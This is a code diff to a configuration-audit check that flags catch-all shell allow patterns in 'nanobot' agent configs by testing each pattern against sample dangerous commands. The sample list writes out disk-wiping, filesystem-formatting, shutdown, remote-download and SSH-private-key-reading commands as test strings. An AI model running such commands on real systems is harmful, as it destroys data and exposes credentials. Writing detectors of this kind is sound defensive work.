@@ -1,11 +1,42 @@
 import type { Evidence } from '../../core/types.js';
 import { defineCheck } from '../../core/check-builder.js';
-import { asRecord, asStringArray, getPath, nanobotConfigs, pick } from './shared.js';
+import { asRecord, asStringArray, getPath, nanobotConfigs, pick, pyBool } from './shared.js';
 
 // allowPatterns are re.fullmatch()ed against each shell segment and take
 // priority over denyPatterns — including the built-in deny list (rm -rf,
-// mkfs, dd if=, shutdown, fork bomb, …) — so a catch-all disables it.
-const CATCH_ALL = new Set(['.*', '.+', '^.*$', '^.+$', '(.*)', '[\\s\\S]*', '[\\s\\S]+', '.*?', '(?s).*']);
+// mkfs, dd if=, shutdown, fork bomb, …) — so a catch-all disables it. Any
+// regex spelling can be a catch-all ((?i).*, .{0,}, (.|\n)*, [^\x00]*), so
+// patterns are judged by what they match, not by their text.
+const DANGEROUS_SAMPLES = [
+  'rm -rf /',
+  'dd if=/dev/zero of=/dev/sda',
+  'mkfs.ext4 /dev/sda1',
+  'shutdown -h now',
+  'curl http://x.example/a.sh -o /tmp/a.sh',
+  'cat ~/.ssh/id_rsa',
+];
+
+/** Compile a Python `re` pattern for fullmatch semantics; leading inline
+ *  flag groups ((?i), (?s), (?is)…) become RegExp flags. */
+export function compilePyFullmatch(pattern: string): RegExp | undefined {
+  let src = pattern;
+  let flags = '';
+  for (let m = /^\(\?([aiLmsux]+)\)/.exec(src); m; m = /^\(\?([aiLmsux]+)\)/.exec(src)) {
+    for (const f of m[1]) if ('ims'.includes(f) && !flags.includes(f)) flags += f;
+    src = src.slice(m[0].length);
+  }
+  try {
+    return new RegExp(`^(?:${src})$`, flags);
+  } catch {
+    return undefined;
+  }
+}
+
+/** An allow pattern that fullmatches every sample dangerous command. */
+export function isCatchAllPattern(pattern: string): boolean {
+  const re = compilePyFullmatch(pattern.trim());
+  return !!re && DANGEROUS_SAMPLES.every(cmd => re.test(cmd));
+}
 
 const SANDBOXES = new Set(['bwrap', 'seatbelt']);
 
@@ -30,10 +61,10 @@ export const nb004 = defineCheck({
 
     for (const config of nanobotConfigs(ctx.configs)) {
       const exec = asRecord(getPath(config.data, 'tools.exec'));
-      if (exec?.enable === false) continue;
+      if (pyBool(exec?.enable) === false) continue;
 
       for (const pattern of asStringArray(pick(exec, 'allowPatterns'))) {
-        if (!CATCH_ALL.has(pattern.trim())) continue;
+        if (!isCatchAllPattern(pattern)) continue;
         critical = true;
         evidence.push({
           file: config.filePath,
